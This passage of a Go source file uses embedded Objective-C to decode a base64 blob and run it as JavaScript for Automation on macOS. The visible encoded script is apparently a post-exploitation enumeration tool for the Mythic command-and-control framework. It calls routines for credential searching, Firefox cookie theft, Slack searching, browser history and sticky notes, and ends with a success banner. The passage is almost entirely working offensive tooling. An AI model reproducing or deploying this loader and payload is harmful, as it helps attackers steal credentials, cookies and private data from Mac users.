ZhcjM7Cgl9CglpZiAob3B0aW9ucy5pbmNsdWRlcygiQ3JlZFNlYXJjaCIpKXsKCQl2YXI0ID0gQ3JlZFNlYXJjaCgpOwoJCW91dHN0cmluZyArPSB2YXI0OwoJfQoJaWYgKG9wdGlvbnMuaW5jbHVkZXMoIlJ1bm5pbmdBcHBzIikpewoJCXZhcjUgPSBSdW5uaW5nQXBwcygpOwoJCW91dHN0cmluZyArPSB2YXI1OwoJfQoKCWlmIChvcHRpb25zLmluY2x1ZGVzKCJIaXN0b3J5IikpewoJCXZhcjYgPSBIaXN0b3J5KCk7CgkJb3V0c3RyaW5nICs9IHZhcjY7Cgl9CgoJaWYgKG9wdGlvbnMuaW5jbHVkZXMoIlNsYWNrU2VhcmNoIikpewoJCXZhcjcgPSBTbGFja1NlYXJjaCgpOwoJCW91dHN0cmluZyArPSB2YXI3OwoJfQoKCWlmIChvcHRpb25zLmluY2x1ZGVzKCJJbnN0YWxsZWRBcHBzIikpewoJCXZhcjggPSBJbnN0YWxsZWRBcHBzKCk7CgkJb3V0c3RyaW5nICs9IHZhcjg7Cgl9CgoJaWYgKG9wdGlvbnMuaW5jbHVkZXMoIkZpcmVmb3hDb29raWVzIikpewoJCXZhcjkgPSBGaXJlZm94Q29va2llcygpOwoJCW91dHN0cmluZyArPSB2YXI5OwoJfQoKCWlmIChvcHRpb25zLmluY2x1ZGVzKCJTdGlja3lOb3RlcyIpKXsKCQl2YXIxMSA9IFN0aWNreU5vdGVzKCk7CgkJb3V0c3RyaW5nICs9IHZhcjExOwoJfQoKCWlmIChvcHRpb25zLmluY2x1ZGVzKCJUZXh0RWRpdENoZWNrIikpewoJCXZhcjEyID0gVGV4dEVkaXRDaGVjaygpOwoJCW91dHN0cmluZyArPSB2YXIxMjsKCX0KfQoKCglyZXR1cm4gb3V0c3RyaW5nCgoKfQoKCkNoZWNrcygnQWxsJykKCi8vTXl0aGljIHVzYWdlOgovL2pzaW1wb3J0IFN3aWZ0QmVsdC1KWEEuanMKLy9qc2ltcG9ydF9jYWxsIENoZWNrcygnZnVuY3Rpb24xLGZ1bmN0aW9uMixmdW5jdGlvbjMuLi4nKQovL2V4OiBqc2ltcG9ydF9jYWxsIENoZWNrcygnU3lzSW5mbyxSdW5uaW5nQXBwcyxUQ0NDaGVjaycpCgovL2xpc3Qgb2YgYWxsIGZ1bmN0aW9uczoKLy9UQ0NDaGVjawovL1NlY0NoZWNrCi8vU3lzSW5mbwovL0NyZWRTZWFyY2gKLy9SdW5uaW5nQXBwcwovL0hpc3RvcnkKLy9TbGFja1NlYXJjaAovL0luc3RhbGxlZEFwcHMKLy9GaXJlZm94Q29va2llcwovL0xvY2tDaGVjawovL1N0aWNreU5vdGVzCi8vVGV4dEVkaXRDaGVjawoK";
    NSData *decoded = [[NSData alloc] initWithBase64EncodedString:mycode options:0];
    NSString *decoded2 = [[NSString alloc] initWithData:decoded encoding:NSUTF8StringEncoding];

    OSALanguage *lang = [OSALanguage languageForName:@"JavaScript"];
    OSAScript *script = [[OSAScript alloc] initWithSource:decoded2 language:lang];
    NSDictionary *__autoreleasing compileError;
    [script compileAndReturnError:&compileError];
    NSDictionary *__autoreleasing runError;
    NSAppleEventDescriptor *res = [script executeAndReturnError:&runError];

    NSString *output = [NSString stringWithFormat:@"%@", res];
    NSLog(output);
    return output;
}
*/
import "C"
import "fmt"

func main() {
	C.jxa()
	fmt.Println("[+] Base64 encoded JXA script successfully executed from golang by way of Objective C!")
}
